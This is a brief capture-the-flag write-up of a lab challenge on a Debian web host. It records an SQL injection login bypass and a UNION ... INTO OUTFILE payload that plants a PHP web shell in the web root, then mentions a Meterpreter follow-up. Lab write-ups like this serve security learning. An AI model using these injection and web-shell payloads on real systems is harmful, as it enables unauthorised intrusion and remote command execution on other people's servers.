## target HOST: 94.237.58.148
## target OS: Debian

### nMap scan output:
nMap scan would not work on that host, and would just sit idleing...

# Exploitation
## Exploits used:
The ip address had a webpage running consisting of a employee login page, it was prone to a sql injection attack
which gave me access to a employee account
### SQL INJECTION:
**' or "1" = "1" -- -**

Inside the employee account, there was a search text field which also had a sql injection vulnerbility.
This time I was able to run a wide range of commands, the database was being run as **root** which had super privileges
i created a php remote code execution shell and accessed the file by using the url

**' union select 1, "<?php system($_REQUEST[0]); ?>", 3, 4, 5 into outfile "/var/www/html/dashboard/shell.php"  -- -**

the flag was found in the root directory which ended the challenge.

## Notes

There was also a config file within the html directory, accessing it revealed the credentials to the sql database. however i was not able to access it using **mysql**
it just kept hanging on me and wouldnt authenticate.

past this point you could have been able to load in a meterpreter payload or something alike and gained full control as **root**
